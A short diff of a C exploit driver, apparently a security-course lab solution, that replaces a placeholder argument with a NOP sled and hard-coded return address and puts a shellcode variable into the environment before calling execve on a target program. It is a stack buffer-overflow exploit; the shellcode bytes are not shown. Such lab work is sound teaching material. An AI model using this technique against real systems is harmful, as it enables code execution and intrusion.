@@ -13,14 +13,17 @@ int main(void)
   char *env[1];
   
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x9b\xdf\xff\xff";
+
   args[2] = NULL;
   
-  env[0] = NULL;
+  env[0] = shellcode;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
   return 0;
 }
+
+
 
 
